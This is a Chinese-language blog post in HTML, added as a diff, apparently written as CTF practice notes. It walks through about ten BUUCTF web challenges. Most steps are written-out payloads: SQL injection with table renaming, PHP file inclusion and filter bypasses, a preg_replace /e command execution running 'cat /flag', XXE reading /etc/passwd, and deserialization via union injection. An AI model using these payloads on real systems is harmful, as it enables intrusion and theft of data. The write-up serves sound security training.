@@ -1,0 +1,280 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="__ SpadeHeart __   __首页    __归档    buu前一页半的一些题__ 发表于 2022-02-05 HCTF2018{WarmUp}     首先在网页源码看到source.php     访问并审计：     hint.php里面的内容为：flag not here, and flag in ffffllllaaaagggg     source.php："><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/2022/05/02/10/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="__ SpadeHeart __   __首页    __归档    buu前一页半的一些题__ 发表于 2022-02-05 HCTF2018{WarmUp}     首先在网页源码看到source.php     访问并审计：     hint.php里面的内容为：flag not here, and flag in ffffllllaaaagggg     source.php："><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2022-05-02T06:11:47.911Z"><meta property="article:modified_time" content="2022-05-02T04:07:32.941Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/05/02/10/"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"datePublished":"2022-05-02T06:11:47.911Z","dateModified":"2022-05-02T04:07:32.941Z","author":{"@type":"Person","name":"John Doe"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"__ SpadeHeart __   __首页    __归档    buu前一页半的一些题__ 发表于 2022-02-05 HCTF2018{WarmUp}     首先在网页源码看到source.php     访问并审计：     hint.php里面的内容为：flag not here, and flag in ffffllllaaaagggg     source.php："}</script><link rel="canonical" href="http://example.com/2022/05/02/10/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+          Array
+              .from(document.querySelectorAll('.tab-content'))
+              .forEach($tab => {
+                  $tab.classList.add('is-hidden');
+              });
+          Array
+              .from(document.querySelectorAll('.tabs li'))
+              .forEach($tab => {
+                  $tab.classList.remove('is-active');
+              });
+          const $activeTab = document.querySelector(location.hash);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T06:11:47.911Z" title="2022/5/2 14:11:47">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T04:07:32.941Z" title="2022/5/2 12:07:32">2022-05-02</time></span><span class="level-item">15 minutes read (About 2206 words)</span></div></div><div class="content"><p><a href="/"> __ SpadeHeart __</a></p>
+<ul>
+<li><p><a href="/%20"> __<br>首页 </a></p>
+</li>
+<li><p><a href="/archives/%20"> __<br>归档 </a></p>
+</li>
+</ul>
+<h1 id="buu前一页半的一些题"><a href="#buu前一页半的一些题" class="headerlink" title="buu前一页半的一些题"></a>buu前一页半的一些题</h1><p>__ 发表于 2022-02-05</p>
+<p>HCTF2018{WarmUp}</p>
+<pre><code>    首先在网页源码看到source.php
+    访问并审计：
+    hint.php里面的内容为：flag not here, and flag in ffffllllaaaagggg
+    source.php：
+    审计发现
+    白名单过滤，只允许[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+    因为我们要传入flag文件路径所以第一个if会为false
+    看到$_page变量
+    这里的截取可以理解为截取?file=xxx?aaa里的file=xxx
+    所以我们把实际要包含的文件放在第二个问号后面，前面用来绕过验证
+    接下来的if还是会false，再往下
+    $_page = urldecode($page)
+    然后再截取一次，这次$_page自身截取
+    所以在这里开始构造payload
+    绕过白名单返回true
+    构造payload：
+    ?file=source.php%253f../../../../../ffffllllaaaagggg
+    中间问号编码是为了绕过源码中的解码语句
+</code></pre>
+<p>强网杯2019{随便注}</p>
+<pre><code>    ?inject=1&#39; union select 1,2,3#
+    返回：return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
+    框内输入：1&#39; order by 2#得知有两列
+    1&#39;;show tables;#
+    看到表1919810931114514
+
+    1&#39;;show columns from `1919810931114514`;#
+    数字表名要用反引号
+
+    1&#39;;show columns from `1919810931114514`;#
+    看到flag列
+
+    前面的注入得知sql语句是会判断id=用户输入的且查询的是words表
+    所以把flag列改名为id列，
+    表名改成words，
+    再利用网站自己的sql语句查询即可
+    1&#39;;rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `1919810931114514` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;#
+
+    接着使用万能钥匙
+    1&#39; or 1=1#
+    得到flag
+</code></pre>
+<p>RoarCTF 2019{Easy Calc}</p>
+<pre><code>    php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+    1.删除空白符
+    2.将某些字符转换为下划线（包括空格）
+    calc.php页面里操作
+    
+    在num前加个空格，waf就找不到num这个变量了，但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
+    calc.php? num=1;var_dump(scandir(chr(47)))
+    看到[7]=&gt; string(5) &quot;f1agg&quot;
+    payload：
+    calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>GYCTF2020{BlackList}</p>
+<pre><code>    本关和随便注看着很像但是增加了黑名单的内容，还是使用堆叠注入
+    1&#39;;show tables;#
+    看到表
+
+    尝试改表名发现：
+    return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);
+
+    使用mysql的handler来读取表信息
+    HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭
+    1&#39;;handler FlagHere open;handler FlagHere read first;#
+</code></pre>
+<p>GXYCTF2019{禁止套娃}</p>
+<pre><code>    .git泄露
+    找到index.php源码
+    ?R表示引用正则表达式本身，那么这里允许传入的就是下面这种格式
+    xxx(xxx(xxx(...)));
+    payload需为函数形式，但是不能有参数
+
+    localeconv() 函数返回一包含本地数字及货币格式信息的数组
+    current() 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。
+    pos() 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。
+
+    构造：
+    ?exp=print_r(scandir(current(localeconv())));
+    回显：Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .git [3] =&gt; flag.php [4] =&gt; index.php ) 
+
+    ?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
+    得到flag
+</code></pre>
+<p>BJDCTF2020{ZJCTF不过如此}</p>
+<pre><code>    ?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
+    得到next.php的源码：
+    &lt;?php
+    $id = $_GET[&#39;id&#39;];
+    $_SESSION[&#39;id&#39;] = $id;
+    function complex($re, $str) &#123;
+        return preg_replace(
+        &#39;/(&#39; . $re . &#39;)/ei&#39;,
+        &#39;strtolower(&quot;\\1&quot;)&#39;,
+        $str
+        );
+    &#125;
+    foreach($_GET as $re =&gt; $str) &#123;
+        echo complex($re, $str). &quot;\n&quot;;
+    &#125;
+    function getFlag()&#123;
+        @eval($_GET[&#39;cmd&#39;]);
+    &#125;
+    preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行
+    第二个参数为strtolower(&quot;\\1&quot;)，实际上也就是strtolower(&quot;\1&quot;)，而\1在正则表达式中有自己的意思，也就是指定第一个匹配项，简单来说就是取出正则表达式匹配后子匹配表达式的第一项
+    题目会把我们传入的一个get参数的key作为re，value作为待匹配字符串，所以我们要利用这个参数来执行getFlag()方法，并在cmd参数传参
+正则表达式
+    \S：匹配所有非空白字符；
+    .号：匹配除\n外的任意字符；
+
+    构造payload：
+    /next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
+</code></pre>
+<p>fake XML cookbook</p>
+<pre><code>    XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
+
+    username和password都是xml格式
+    可以添加自己的实体来获取服务器信息
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+    &lt;!DOCTYPE note [
+      &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;
+      ]&gt;
+    &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
+    看到passwd信息
+    所以把&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;改成flag路径即可
+</code></pre>
+<p>朴实无华</p>
+<pre><code>    网页标题有bot
+    访问robots.txt，看到：/fAke_f1agggg.php
+    响应头有：/fl4g.php
+    访问看到代码
+
+    level1：
+    如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型
+    因此num可以构造为2e4
+
+    level2：
+    找到一串数字使它md5加密前后数值相等
+    用科学记数法0e绕过
+    md5=0e215962017
+
+    开始get flag
+    传参不能有空格，如果有cat，将会被替换为wctf2020
+    get_flag=ls
+    回显文件有flag
+    $IFS$1代替空格
+</code></pre>
+<p>easy-java</p>
+<pre><code>    点击help
+    看到url里有文件包含
+    题目是easy-java
+    认为是web.xml泄露
+    ?filename=WEB-INF/web.xml（GET改成POST，因为servlet有doGet和doPost，所以可以两个都试试）
+    回显web.xml
+
+    看到：com.wm.ctf.FlagController
+    访问
+    ?filename=WEB-INF/classes/com/wm/ctf/FlagController.class
+    看到一段base64编码，解码得到flag
+</code></pre>
+<p>FakeBook</p>
+<pre><code>    注册发现username有超链接
+    ?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()#
+    users
+
+    ?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name=&#39;users&#39;#
+    no,username,passwd,data
+
+    ?no=0 union all select 1,data,3,4 from users
+    发现序列化对象
+    找源码备份
+    访问robots.txt看到：/user.php.bak
+    【*】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。
+    【*】curl_setopt ： 请求一个url。
+    【*】CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。
+    【*】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。
+    【*】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。
+    【*】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。
+    【*】curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。
+    
+    到这里可以发现，这题是反序列化，我们构造一个序列化对象并把blog内容设置为file协议读取flag.php，它被传入之后网站在显示博客内容时就会反序列化，进而执行恶意代码，读取flag
+
+    构造序列化对象：
+    O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;
+
+    构造到联合注入语句里：
+    ?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;
+    源码里找到flag进行base64解码
+</code></pre>
+<p><a href="/2022/01/31/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" title="thinkphp反序列化利用链"><br>__thinkphp反序列化利用链</a></p>
+<p><a href="/2022/02/10/buu%E5%87%A0%E9%81%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" title="buu几道php反序列化题目"> buu几道php反序列化题目<br>__</a></p>
+<p><a href="/archives/%20%7C%7C%20archive"> 33 日志 </a></p>
+<p>(C) 2022 __ Dan Kuroto</p>
+<p>由 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动</p>
+<p>|</p>
+<p>主题 – <a target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</p>
+<p>__</p>
+</div><div class="article-licensing box"><div class="licensing-title"><p><a href="http://example.com/2022/05/02/10/">http://example.com/2022/05/02/10/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-05-02</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-05-02</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/05/02/11/"><i class="level-item fas fa-chevron-left"></i><span class="level-item"> </span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/02/9/"><span class="level-item"> </span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="SpadeAce"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">SpadeAce</p><p class="is-size-6 is-block">kamen rider</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">15</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/SpadeHeart/SpadeHeart.github.io" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/SpadeHeart/SpadeHeart.github.io"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.917Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/14/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.916Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/13/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.914Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/12/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.912Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/11/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.911Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/10/"> </a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2022 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
